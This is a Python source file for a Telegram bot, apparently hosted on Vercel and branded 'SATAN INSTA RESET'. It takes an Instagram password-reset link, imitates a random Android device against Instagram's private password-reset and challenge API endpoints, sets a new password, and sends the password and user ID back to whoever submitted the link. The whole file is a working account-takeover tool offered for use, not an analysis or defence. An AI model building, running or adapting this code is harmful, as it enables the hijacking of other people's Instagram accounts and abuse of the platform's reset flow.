import os
import random
import string
import uuid
import requests
import json
from datetime import datetime
from flask import Flask, request
import telebot

app = Flask(__name__)
TOKEN = os.getenv('BOT_TOKEN')
bot = telebot.TeleBot(TOKEN)

# --- CORE LOGIC (NO 2FA/CHECKPOINT LOGIC) ---

def generate_device_info():
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; 480dpi; 1080x1920; samsung; SM-G975F; intel; en_US; {random.randint(100,999)})"
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    nums = ''.join([str(random.randint(1, 9)) for _ in range(4)])
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:Random@{nums}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid or "",
        "User-Agent": user_agent,
    }

def reset_instagram_password(reset_link):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
        
        # Link Parsing
        if "uidb36=" not in reset_link or "&token=" not in reset_link:
            return {"success": False}

        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token = reset_link.split("&token=")[1].split(":")[0].split("&")[0]

        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": ANDROID_ID,
            "token": token,
            "waterfall_id": WATERFALL_ID
        }
        
        r = requests.post(url, headers=make_headers(user_agent=USER_AGENT), data=data, timeout=5)
        
        if "user_id" not in r.text:
            return {"success": False}

        mid = r.headers.get("Ig-Set-X-Mid")
        resp_json = r.json()
        user_id = resp_json.get("user_id")
        cni = resp_json.get("cni")
        nonce_code = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")

        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id": str(user_id),
            "cni": str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        
        r2_resp = requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data2, timeout=5)
        r2_text = r2_resp.text
        
        # Extraction - If it fails here (due to 2FA), return false
        try:
            challenge_context_final = r2_text.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]
        except:
            return {"success": False}

        data3 = {
            "is_caa": "False",
            "cni": str(cni),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1": PASSWORD,
            "enc_new_password2": PASSWORD
        }
        
        requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data3, timeout=5)
        
        return {
            "success": True, 
            "password": PASSWORD.split(":")[-1], 
            "user_id": user_id
        }
    except:
        return {"success": False}

# --- BOT HANDLERS ---

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "⸸ SATAN INSTA RESET ACTIVE 𓄋\nSend me the reset link.")

@bot.message_handler(func=lambda m: "instagram.com" in m.text)
def handle(message):
    bot.send_message(message.chat.id, "🔄 Processing reset...")
    
    res = reset_instagram_password(message.text.strip())
    if res["success"]:
        msg = f"✅ SUCCESS\n\nUSER ID: {res['user_id']}\nNEW PASS: {res['password']}\n\nBY: @xYourKing"
        bot.send_message(message.chat.id, msg)
    else:
        # No 2FA message, just a simple fail.
        bot.send_message(message.chat.id, "❌ Reset Failed. Link is expired, invalid, or requires 2FA.")

# --- VERCEL CONFIG ---

@app.route('/api/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
        return '', 200
    return 'Forbidden', 403

@app.route('/')
def home():
    return "Bot Online"
